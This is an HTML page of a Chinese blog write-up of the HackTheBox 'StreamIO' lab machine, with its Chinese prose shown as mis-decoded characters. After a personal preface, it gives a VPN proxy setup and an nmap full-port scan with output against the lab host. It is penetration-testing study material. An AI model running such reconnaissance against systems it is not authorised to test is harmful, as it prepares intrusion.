<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="å‰è¨€åœ¨ä»Šå¹´çš„9æœˆåº•ä¹‹å‰ï¼Œæˆ‘æ‹¿åˆ°äº†å‡ å®¶æ¯”è¾ƒå¿ƒä»ªçš„offerï¼Œäº’è”ç½‘å¤§å‚å®‰å…¨å²—å’Œä¹™æ–¹å®‰å…¨å²—çš†æœ‰ã€‚å›æƒ³è‡ªå·±ä»Šå¹´ä¸‹åŠå¹´çš„ç”Ÿæ´»ï¼Œè¿˜æ˜¯æ¯”è¾ƒå……å®çš„ã€‚ä¸€è¾¹å®ä¹ ï¼Œä¸€è¾¹å‡†å¤‡ç§‹æ‹›ï¼Œä¸€è¾¹åˆç ”ç©¶è‡ªå·±æ„Ÿå…´è¶£çš„å®‰å…¨æŠ€æœ¯ã€‚åœ¨æ‹¿åˆ°äº†ç§‹æ‹›offerçš„ä¸€ä¸ªæœˆåï¼Œæˆ‘å‘å®éªŒå®¤æ€»ç›‘æäº¤äº†ç¦»èŒç”³è¯·ã€‚ç¦»èŒçš„æœ€åä¸€æ™šï¼Œæˆ‘åœ¨æœ›äº¬SOHOè½¬äº†ä¸€åœˆï¼Œå¿½ç„¶å‘ç°è‡ªå·±å·²ç»å¾ˆèˆä¸å¾—è¿™é‡Œäº†ã€‚  æˆ‘èµ·åˆçš„æƒ³æ³•æ˜¯è§‰å¾—å›å­¦æ ¡èƒ½å¤Ÿæ›´è½»æ¾è‡ªç”±ä¸€ç‚¹ï¼Œæƒ³å­¦ä»€ä¹ˆå°±å­¦ä»€ä¹ˆã€‚ä½†æ˜¯å›">
<meta property="og:type" content="article">
<meta property="og:title" content="[hackthebox]StreamIO WriteUp">
<meta property="og:url" content="https://blog.rainb0w.top/2023/12/10/htbStreamIO/index.html">
<meta property="og:site_name" content="rainb0w">
<meta property="og:description" content="å‰è¨€åœ¨ä»Šå¹´çš„9æœˆåº•ä¹‹å‰ï¼Œæˆ‘æ‹¿åˆ°äº†å‡ å®¶æ¯”è¾ƒå¿ƒä»ªçš„offerï¼Œäº’è”ç½‘å¤§å‚å®‰å…¨å²—å’Œä¹™æ–¹å®‰å…¨å²—çš†æœ‰ã€‚å›æƒ³è‡ªå·±ä»Šå¹´ä¸‹åŠå¹´çš„ç”Ÿæ´»ï¼Œè¿˜æ˜¯æ¯”è¾ƒå……å®çš„ã€‚ä¸€è¾¹å®ä¹ ï¼Œä¸€è¾¹å‡†å¤‡ç§‹æ‹›ï¼Œä¸€è¾¹åˆç ”ç©¶è‡ªå·±æ„Ÿå…´è¶£çš„å®‰å…¨æŠ€æœ¯ã€‚åœ¨æ‹¿åˆ°äº†ç§‹æ‹›offerçš„ä¸€ä¸ªæœˆåï¼Œæˆ‘å‘å®éªŒå®¤æ€»ç›‘æäº¤äº†ç¦»èŒç”³è¯·ã€‚ç¦»èŒçš„æœ€åä¸€æ™šï¼Œæˆ‘åœ¨æœ›äº¬SOHOè½¬äº†ä¸€åœˆï¼Œå¿½ç„¶å‘ç°è‡ªå·±å·²ç»å¾ˆèˆä¸å¾—è¿™é‡Œäº†ã€‚  æˆ‘èµ·åˆçš„æƒ³æ³•æ˜¯è§‰å¾—å›å­¦æ ¡èƒ½å¤Ÿæ›´è½»æ¾è‡ªç”±ä¸€ç‚¹ï¼Œæƒ³å­¦ä»€ä¹ˆå°±å­¦ä»€ä¹ˆã€‚ä½†æ˜¯å›">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pic.imgdb.cn/item/6575bc30c458853aefce847a.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760ea0c458853aef530ad8.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760eb0c458853aef5321be.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760ebac458853aef53343a.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760ec7c458853aef535078.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760ed3c458853aef536a2a.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760edec458853aef537a1d.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760eeac458853aef5388e3.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760ef4c458853aef539eff.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760f03c458853aef53bfaa.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760f0cc458853aef53cb7a.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760f16c458853aef53db73.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760f22c458853aef53f10d.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760f3bc458853aef542183.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760f47c458853aef5434e6.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760f55c458853aef54499a.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760f5fc458853aef545dce.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760f6bc458853aef547ee9.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760f77c458853aef549a27.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760f82c458853aef54abf6.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760f8cc458853aef54bf54.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760f99c458853aef54d8a9.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760fa4c458853aef54eeaa.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760fb7c458853aef550a56.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760fc1c458853aef55189c.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760fcac458853aef552d57.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760fd5c458853aef5545e2.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760fe0c458853aef5559a3.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/65760fedc458853aef557252.jpg">
<meta property="article:published_time" content="2023-12-10T00:00:00.000Z">
<meta property="article:modified_time" content="2023-12-10T19:43:45.840Z">
<meta property="article:author" content="rainb0w">
<meta property="article:tag" content="hackthebox">
<meta property="article:tag" content="åŸŸæ¸—é€">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pic.imgdb.cn/item/6575bc30c458853aefce847a.jpg">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>[hackthebox]StreamIO WriteUp</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Articles</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/01/09/test/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/08/08/Memory_WebShell/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.rainb0w.top/2023/12/10/htbStreamIO/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&text=[hackthebox]StreamIO WriteUp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&title=[hackthebox]StreamIO WriteUp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&is_video=false&description=[hackthebox]StreamIO WriteUp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=[hackthebox]StreamIO WriteUp&body=Check out this article: https://blog.rainb0w.top/2023/12/10/htbStreamIO/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&title=[hackthebox]StreamIO WriteUp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&title=[hackthebox]StreamIO WriteUp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&title=[hackthebox]StreamIO WriteUp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&title=[hackthebox]StreamIO WriteUp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&name=[hackthebox]StreamIO WriteUp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&t=[hackthebox]StreamIO WriteUp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GetShell"><span class="toc-number">2.</span> <span class="toc-text">GetShell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GetAdministrator"><span class="toc-number">3.</span> <span class="toc-text">GetAdministrator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">æ€»ç»“</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        [hackthebox]StreamIO WriteUp
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">rainb0w</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-12-10T00:00:00.000Z" class="dt-published" itemprop="datePublished">2023-12-10</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/hackthebox/" rel="tag">hackthebox</a>, <a class="p-category" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">åŸŸæ¸—é€</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨ä»Šå¹´çš„9æœˆåº•ä¹‹å‰ï¼Œæˆ‘æ‹¿åˆ°äº†å‡ å®¶æ¯”è¾ƒå¿ƒä»ªçš„offerï¼Œäº’è”ç½‘å¤§å‚å®‰å…¨å²—å’Œä¹™æ–¹å®‰å…¨å²—çš†æœ‰ã€‚å›æƒ³è‡ªå·±ä»Šå¹´ä¸‹åŠå¹´çš„ç”Ÿæ´»ï¼Œè¿˜æ˜¯æ¯”è¾ƒå……å®çš„ã€‚ä¸€è¾¹å®ä¹ ï¼Œä¸€è¾¹å‡†å¤‡ç§‹æ‹›ï¼Œä¸€è¾¹åˆç ”ç©¶è‡ªå·±æ„Ÿå…´è¶£çš„å®‰å…¨æŠ€æœ¯ã€‚åœ¨æ‹¿åˆ°äº†ç§‹æ‹›offerçš„ä¸€ä¸ªæœˆåï¼Œæˆ‘å‘å®éªŒå®¤æ€»ç›‘æäº¤äº†ç¦»èŒç”³è¯·ã€‚ç¦»èŒçš„æœ€åä¸€æ™šï¼Œæˆ‘åœ¨æœ›äº¬SOHOè½¬äº†ä¸€åœˆï¼Œå¿½ç„¶å‘ç°è‡ªå·±å·²ç»å¾ˆèˆä¸å¾—è¿™é‡Œäº†ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/6575bc30c458853aefce847a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575bc30c458853aefce847a.jpg"></a></p>
<p>æˆ‘èµ·åˆçš„æƒ³æ³•æ˜¯è§‰å¾—å›å­¦æ ¡èƒ½å¤Ÿæ›´è½»æ¾è‡ªç”±ä¸€ç‚¹ï¼Œæƒ³å­¦ä»€ä¹ˆå°±å­¦ä»€ä¹ˆã€‚ä½†æ˜¯å›åˆ°å­¦æ ¡ä¹‹åçš„ä¸€ä¸ªå¤šæœˆé‡Œï¼Œæˆ‘å‡ ä¹å¤©å¤©éƒ½åœ¨æ‘†çƒ‚ï¼Œæ¯å¤©ä¸æ˜¯åˆ·åˆ·bç«™å°±æ˜¯ç©ç©æ¸¸æˆï¼Œå®Œå…¨æä¸èµ·å­¦ä¹ çš„å¿µå¤´ï¼Œä¹‹å‰æƒ³å¥½çš„è®¡åˆ’ä¹Ÿå…¨éƒ¨è½ç©ºã€‚ç›´åˆ°å‰äº›å¤©ï¼Œçœ‹åˆ°äº†Fakerå¤ºå† ã€‚</p>
<p>æˆ‘å¤§çº¦æ˜¯ä»S6å¼€å§‹å…³æ³¨è‹±é›„è”ç›Ÿèµ›äº‹çš„ã€‚åœ¨æˆ‘åˆšåˆšè§‚çœ‹è‹±é›„è”ç›Ÿæ¯”èµ›çš„æ—¶å€™ï¼ŒFakerå°±å·²ç»æ˜¯å½“ä¹‹æ— æ„§çš„GOATäº†ã€‚æˆ‘å¯¹Fakeræœ€åˆçš„å°è±¡æ˜¯è§‰å¾—ä»–ä¸ªäººå®åŠ›å¾ˆå¼ºï¼Œå…‰æ˜¯åœ¨ä¸­è·¯ç«™ç€å°±å·²ç»è®©äººæ„Ÿè§‰è„ŠèƒŒå‘å‡‰äº†ã€‚ä½†æ˜¯æˆ‘å´å¹¶ä¸æ˜¯ä»S6ï¼Œä¹Ÿå°±æ˜¯Fakeræˆä¸ºä¸‰å† ç‹çš„æ—¶å€™å¼€å§‹å–œæ¬¢Fakerçš„ã€‚æˆ‘æœ€å¼€å§‹å–œæ¬¢Fakerçš„æ—¶å€™ï¼Œæ˜¯åœ¨å»å¹´å…¨çƒæ€»å†³èµ›åŠå†³èµ›ï¼ŒT1å¯¹é˜µJDGçš„æ—¶å€™ã€‚æˆ‘è®°å¾—å½“æ—¶æ˜¯ç¬¬å››å±€ï¼ŒFakeræ“åˆ€çš„æ²™çš‡åœ¨è¿™ä¸€å±€é‡Œå‘æŒ¥éå¸¸äº®çœ¼ã€‚å°è±¡å¾ˆæ·±çš„ä¸€æ³¢æ˜¯Fakeråœ¨JDGè“åŒºæœæ–­é—ªç°è¿‡å¢™èµ¶è·¯ï¼Œç„¶åå¤§æ‹›æ¨å›ä¸¤äººï¼Œä»é‚£ä¸€åˆ»èµ·ï¼Œè¿™åœºæ¯”èµ›å¯¹äºJDGæ¥è¯´å·²ç»æ¸æ¸èµ°è¿œäº†ã€‚ä½†è¿™ä¸€æ³¢ä¹Ÿåªèƒ½è¯´æ˜Fakeræ˜¯ä¸€ä¸ªå¾ˆæœæ–­ã€é¢å¯¹æœºä¼šæ•¢äºå¤§èƒ†å°è¯•çš„é€‰æ‰‹ï¼ŒçœŸæ­£è®©æˆ‘æ„Ÿåˆ°åŠ¨å®¹çš„æ˜¯åœ¨åé¢ä¸­è·¯çš„ä¸€æ³¢å›¢æˆ˜ï¼ŒFakeræ¼‚ç§»+å¤§æ‹›æ¨åˆ°æ•Œæ–¹å››ä¸ªäººçš„é‚£ä¸€æ³¢ã€‚é‚£ä¸€æ³¢æ‰“å®Œä¹‹åï¼Œé•œå¤´ç»™äº†Fakerä¸€ä¸ªç‰¹å†™ï¼Œæˆ‘çœ‹åˆ°Fakeræ»¡å«ç¬‘æ„çš„çœ¼ç›é‡Œå‡ºç°äº†ä¸€æ»´çœ¼æ³ªã€‚</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760ea0c458853aef530ad8.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760ea0c458853aef530ad8.jpg"></a></p>
<p>é‚£ä¸€åˆ»ï¼Œæˆ‘æ·±æ·±åœ°è¢«Fakerçš„ä¸ªäººé­…åŠ›æ‰€æŠ˜æœã€‚é‚£ä¸ªæ—¶å€™è·ç¦»Fakerç¬¬ä¸€æ¬¡ç™»ä¸Šèµ›åœºå·²ç»è¿‡å»å¾ˆå¤šå¹´äº†ï¼Œä½†æ˜¯Fakerå¯¹äºè‹±é›„è”ç›Ÿçš„çƒ­çˆ±å´ä»æœªå‡å¼±ã€‚å³ä½¿å¾ˆå¤šäººè§‰å¾—ä»–å·²ç»è€äº†ï¼Œå·²ç»å®Œå…¨æ²¡æœ‰åŠæ³•è·Ÿå¹´è½»äººå»æ‹¼æ“ä½œäº†ï¼Œä½†æ˜¯ä»–ä¾ç„¶å‡­å€Ÿè‡ªå·±çš„åŠªåŠ›ç«™åœ¨æ¯”èµ›çš„èˆå°ä¸Šå¹¶æ‰“å‡ºå‡ºè‰²çš„è¡¨ç°ã€‚å› æ­¤å³ä½¿å»å¹´T1å†³èµ›è¾“ç»™äº†DRXï¼Œæˆ‘ä¹Ÿå¹¶æœªå¯¹Fakerçš„å–œçˆ±å‡å°‘åŠåˆ†ï¼Œå› ä¸ºæˆ‘ç›¸ä¿¡åƒä»–è¿™æ ·çš„äººï¼Œæ˜¯ä¸€å®šä¼šå†å¾—åˆ°ä¸€ä¸ªå† å†›çš„ã€‚</p>
<p>åªæ˜¯å‘½è¿ä¼¼ä¹æ€»æ˜¯å–œæ¬¢æ‰å¼„äººï¼Œå®ƒåœ¨è®©ä¸€ä¸ªäººæˆåŠŸä¹‹å‰ï¼Œæ€»æ˜¯è¦å…ˆè®©è¿™ä¸ªäººåƒç‚¹è‹¦å¤´ã€‚åœ¨ T1 æ‹¿åˆ°äº†ä¸–ç•Œèµ›äºšå†›ä¹‹åï¼Œå‘½è¿åˆé€ç»™äº†è¿™æ”¯é˜Ÿä¼ä¸¤æ¬¡äºšå†›ï¼ŒT1ä¹Ÿè¢«æˆç§°ä¸ºå¤§æ»¡äºšé˜Ÿä¼ã€‚åœ¨ä»Šå¹´7æœˆä»½çš„æ—¶å€™ï¼ŒFakerå› ä¸ºæ‰‹ä¼¤æŠ˜ç£¨ï¼Œä¸‹åœºä¼‘æ¯äº†ä¸€ä¸ªæœˆã€‚åœ¨è¿™ä¸€ä¸ªæœˆçš„æ—¶é—´é‡Œï¼ŒT1æ‰“äº†8ä¸ªBO3åªèµ¢äº†1æŠŠã€‚è¯´å®è¯ï¼Œå½“æ—¶çœ‹åˆ°è¿™ä¸ªæˆ˜ç»©çš„æ—¶å€™ï¼Œæˆ‘å°±å¯¹äºä»Šå¹´T1èƒ½å¤Ÿå†æ‹¿åˆ°ä¸€ä¸ªå† å†›ä¸å†æŠ±æœ‰ä»»ä½•ä¿¡å¿ƒäº†ã€‚ä½†æ˜¯Fakerå›æ¥ä¹‹åï¼Œåˆå¸¦é¢†4ä¸ªé˜Ÿå‹æˆåŠŸæ€åˆ°å¤å­£èµ›å†³èµ›ï¼Œç„¶ååˆæ‹¿äº†ä¸€ä¸ªäºšå†›â€¦â€¦è™½è¯´ä¸ä¹‹å‰çš„æˆ˜ç»©ç›¸æ¯”äºšå†›ä¹Ÿå·²ç»å¯ä»¥äº†ï¼Œä½†æ˜¯æˆ‘ä¹Ÿå¹¶ä¸è§‰å¾—ä»Šå¹´Fakerèƒ½å¤Ÿæ‹¿åˆ°å† å†›ã€‚å› ä¸ºå»å¹´ä¸€è·¯æ‰€å‘æŠ«é¡éƒ½æ²¡æœ‰æ‹¿åˆ°å† å†›ï¼Œæ›´ä½•å†µä»Šå¹´å‘¢ï¼Ÿè€Œä¸–ç•Œèµ›åˆæœŸT1çš„è¡¨ç°ä¼¼ä¹ä¹Ÿå°è¯äº†æˆ‘çš„æƒ³æ³•ï¼Œæ¯”å¦‚T1ç¬¬ä¸€å±€å¯¹é˜µTLéƒ½å·®ç‚¹ç¿»è½¦ï¼Œç¢°åˆ°Gengåˆè¾“äº†ä¸€å±€ã€‚ç„¶åæˆ‘å°±æ˜¯æŠ±ç€è¿™æ ·çœ‹è¡°çš„å¿ƒæ€ï¼Œçœ‹ç€Fakerå¸¦ç€4ä¸ªé˜Ÿå‹ä¸€è·¯è¿‡äº”å…³æ–©å…­å°†ï¼Œä»¥å¯¹ä½ LPLèµ›åŒº 11-1çš„è±ªåæˆ˜ç»©æ‹¿åˆ°äº†ä¸–ç•Œèµ›çš„å† å†›ã€‚</p>
<p>çœ‹åˆ°Fakeræ‹¿åˆ°äº†ä»–çš„ç¬¬å››å† ï¼Œæˆ‘æ˜¯æ‰“å¿ƒåº•é‡Œä½©æœå’Œé«˜å…´çš„ï¼Œä½†æ˜¯é«˜å…´ä¹‹ä½™åˆä¼šæƒ³åˆ°è‡ªå·±ã€‚è¿™æ®µæ—¶é—´æˆ‘ä¸€ç›´åœ¨é—®è‡ªå·±å¯ä¸å¯ä»¥åšåˆ°åƒFakerè¿™æ ·ï¼Œå¯¹äºè‡ªå·±çƒ­çˆ±çš„äº‹ä¸šæ•°åå¹´å¦‚ä¸€æ—¥çš„åšæŒä¸‹å»ã€‚Fakerä»S6ä¹‹åçš„æ•…äº‹ä¼¼ä¹åªæ˜¯åœ¨å‘Šè¯‰æˆ‘ä»¬ä¸€ä»¶äº‹ï¼Œé‚£å°±æ˜¯ç”¨åå¹´çš„æ—¶é—´åšæŒä¸æ‡ˆçš„å»åšä¸€ä»¶äº‹ï¼Œæ¢¦æƒ³æ‰æœ‰å¯èƒ½æˆçœŸã€‚åœ¨æ˜ç™½äº†è¿™ä¸€ç‚¹ä¹‹åï¼Œæˆ‘å¼€å§‹æ‰“èµ·ç²¾ç¥ã€‚æˆ‘å¸Œæœ›è‡ªå·±å¯ä»¥åšåˆ°åƒFakeré‚£æ ·ï¼Œä¿æŒè°¦é€Šï¼Œå¹¶ä¸”å¯¹äºè‡ªå·±çƒ­çˆ±çš„äº‹æƒ…å¯ä»¥å…¨åŠ›ä»¥èµ´åœ°å»åšã€‚</p>
<p>å› æ­¤æœ€è¿‘æˆ‘åˆæœ‰äº†å­¦ä¹ çš„åŠ¨åŠ›ï¼Œè¿™äº›å¤©ä¹Ÿæ˜¯æŒ‘äº†ä¸€äº›HTBçš„é¶æœºæ‰“äº†æ‰“ï¼Œæƒ³è®©è‡ªå·±çš„æ‰‹æ„Ÿæ¢å¤èµ·æ¥ã€‚æ¥ä¸‹æ¥çš„æ–‡ç« å°±æ˜¯å¯¹æˆ‘åœ¨æ‰“StreamIOè¿™å°é¶æœºçš„æ—¶å€™æ‰€æƒ³åˆ°çš„ä¸€äº›æ€è·¯å’Œé‡‡ç”¨çš„æ–¹æ³•åšä¸€ä¸ªè®°å½•ï¼Œå°½å¯èƒ½è¯¦ç»†å§ã€‚</p>
<h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><p>å› ä¸ºé¶åœºæ¯”è¾ƒå¤æ‚ï¼Œä¸ºäº†ä½¿å¾—ç½‘ç»œå°½é‡ç¨³å®šï¼Œæˆ‘ä»¬åœ¨è¿æ¥VPNçš„æ—¶å€™å¯ä»¥é€šè¿‡ä»£ç†æœåŠ¡å™¨è¿æ¥ã€‚å‘.ovpnæ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹é…ç½®ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760eb0c458853aef5321be.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760eb0c458853aef5321be.jpg"></a></p>
<p>å…¶ä¸­192.168.135.1æ˜¯æˆ‘çš„ä»£ç†æœåŠ¡å™¨çš„IPï¼Œ7890æ˜¯ä»£ç†ç«¯å£ï¼Œä½ éœ€è¦æ”¹æˆä½ è‡ªå·±çš„ã€‚å¦å¤–OpenVPNçš„http-proxyå¿…é¡»ä½¿ç”¨TCPåè®®ã€‚é€šè¿‡ä»£ç†è¿æ¥VPNï¼Œé€Ÿåº¦è¿˜æ˜¯æ¯”è¾ƒå¿«çš„ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760ebac458853aef53343a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760ebac458853aef53343a.jpg"></a></p>
<p>æ¥ä¸‹æ¥å¼€å§‹æ‰“é¶ï¼Œé¦–å…ˆæ‰§è¡Œ<code>nmap -sT -p- --min-rate 5000 -oA nmapscan/ports 10.10.11.158</code>çœ‹çœ‹å¼€æ”¾çš„ç«¯å£ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.94SVN scan initiated Fri Dec  8 00:36:44 2023 as: nmap -sT -p- --min-rate 5000 -oA nmapscan/ports 10.10.11.158</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.158</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 65517 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">80/tcp    open  http</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">443/tcp   open  https</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49673/tcp open  unknown</span><br><span class="line">49674/tcp open  unknown</span><br><span class="line">49705/tcp open  unknown</span><br><span class="line">51260/tcp open  unknown</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nmap done at Fri Dec  8 00:38:18 2023 -- 1 IP address (1 host up) scanned in 93.30 seconds</span></span><br></pre></td></tr></table></figure>

